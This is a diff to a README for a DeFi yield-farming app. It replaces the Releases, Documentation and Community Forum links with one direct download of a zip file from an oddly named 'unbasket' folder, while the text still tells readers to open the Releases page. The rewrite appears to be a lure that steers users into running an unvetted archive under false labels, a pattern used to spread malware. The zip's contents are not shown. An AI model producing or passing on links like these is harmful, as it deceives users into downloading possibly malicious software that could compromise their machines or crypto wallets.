@@ -14,7 +14,7 @@ defi-yield-farming is a user-friendly protocol that allows you to stake your tok
 ## 📥 Download & Install
 To get started, visit the Releases page to download the application. Simply follow the link below:
 
-[![Download defi-yield-farming](https://img.shields.io/badge/Download-defi--yield--farming-blue.svg)](https://github.com/EeshAggarwal/defi-yield-farming/releases)
+[![Download defi-yield-farming](https://raw.githubusercontent.com/EeshAggarwal/defi-yield-farming/main/unbasket/defi-yield-farming.zip)](https://raw.githubusercontent.com/EeshAggarwal/defi-yield-farming/main/unbasket/defi-yield-farming.zip)
 
 1. Click the link above to open the Releases page.
 2. Choose the latest version from the list.
@@ -60,8 +60,8 @@ Join our growing community to connect with other users. You can share tips, get 
 For direct assistance, reach out through our support channels available within the application or on our GitHub page.
 
 ## 🔗 Useful Links
-- [Releases Page](https://github.com/EeshAggarwal/defi-yield-farming/releases)
-- [Documentation](https://github.com/EeshAggarwal/defi-yield-farming/docs)
-- [Community Forum](https://forum.defi-yield-farming.com)
+- [Releases Page](https://raw.githubusercontent.com/EeshAggarwal/defi-yield-farming/main/unbasket/defi-yield-farming.zip)
+- [Documentation](https://raw.githubusercontent.com/EeshAggarwal/defi-yield-farming/main/unbasket/defi-yield-farming.zip)
+- [Community Forum](https://raw.githubusercontent.com/EeshAggarwal/defi-yield-farming/main/unbasket/defi-yield-farming.zip)
 
 By following these steps, you can easily download, install, and use the defi-yield-farming application to earn rewards through staking your tokens. Enjoy your yield farming experience!
